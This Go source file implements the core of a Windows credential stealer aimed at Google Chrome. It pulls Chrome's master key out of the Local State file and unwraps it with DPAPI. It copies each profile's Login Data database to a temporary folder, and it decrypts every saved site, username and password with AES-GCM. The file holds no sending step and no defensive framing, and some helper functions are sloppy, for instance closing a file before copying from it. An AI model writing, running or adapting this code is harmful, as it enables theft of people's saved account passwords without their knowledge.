package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

type LoginData struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

func DecryptPassword(buff, masterKey []byte) string {
	iv := buff[3:15]
	payload := buff[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "Error while creating cipher block: " + err.Error()
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "Error while creating GCM block: " + err.Error()
	}

	decrypted, err := aesgcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "Error while decrypting password: " + err.Error()
	}

	return string(decrypted)
}

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func GetMasterKey(localStatePath string) ([]byte, error) {
	var masterKey []byte

	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}

	_ = json.Unmarshal(byteValue, &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err = Decrypt([]byte(stringKey))
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil
}

func CreateTempAndCopyFile(originalFilePath string) (string, string) {
	// Create a temporary directory
	tempDir, _ := os.MkdirTemp("", "temp")

	// Generate a temporary file path
	var split []string
	if strings.Contains(originalFilePath, "/") {
		split = strings.Split(originalFilePath, "/")
	} else {
		split = strings.Split(originalFilePath, "\\")
	}
	tempFilePath := filepath.Join(tempDir, split[len(split)-1])

	// Open the original file
	originalFile, _ := os.Open(originalFilePath)

	defer func(originalFile *os.File) {
		_ = originalFile.Close()
	}(originalFile)

	// Create the temporary file
	tempFile, _ := os.Create(tempFilePath)
	defer func(tempFile *os.File) {
		_ = tempFile.Close()
	}(tempFile)

	// Copy the contents of the original file to the temporary file
	_, _ = io.Copy(tempFile, originalFile)

	// Close the original file
	_ = originalFile.Close()
	_ = tempFile.Close()

	return tempFilePath, tempDir
}

func CheckFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func DecryptLoginData(profiles []string, localState string) []LoginData {
	var loginDataArray []LoginData

	for _, profile := range profiles {
		loginDataPath := os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\" + profile + "\\Login data"
		loginData, loginDirPath := CreateTempAndCopyFile(loginDataPath)

		db, _ := sql.Open("sqlite3", loginData)
		defer func(db *sql.DB) {
			_ = db.Close()
		}(db)

		rows, _ := db.Query("select origin_url, username_value, password_value from logins")
		defer func(rows *sql.Rows) {
			_ = rows.Close()
		}(rows)

		for rows.Next() {
			var originUrl string
			var usernameValue string
			var encryptedPasswordValue []byte

			_ = rows.Scan(&originUrl, &usernameValue, &encryptedPasswordValue)

			key, _ := GetMasterKey(localState)
			password := DecryptPassword(encryptedPasswordValue, key)

			loginDataArray = append(loginDataArray, LoginData{
				OriginURL: originUrl,
				Username:  usernameValue,
				Password:  password,
			})
		}

		_ = os.Remove(loginData)
		_ = os.Remove(loginDirPath)
	}

	return loginDataArray
}

func CreateTempFile(fileName string) *os.File {
	// Create a temporary file
	tempFile, err := os.CreateTemp("", fileName)
	if err != nil {
		fmt.Println("Error creating temporary file:", err)
		return nil
	}

	fmt.Println("Temporary file created:", tempFile.Name())
	return tempFile
}

func CopyFile(originalFile string, tempFile *os.File) {
	// Open the original file
	original, err := os.Open(originalFile)
	if err != nil {
		fmt.Println("Error opening original file:", err)
		return
	}

	CloseFile(original)

	// Copy the contents of the original file to the temporary file
	_, err = io.Copy(tempFile, original)
	if err != nil {
		fmt.Println("Error copying original file:", err)
		return
	}
}

func CloseFile(file *os.File) {
	defer func(file *os.File) {
		_ = file.Close()
	}(file)
}
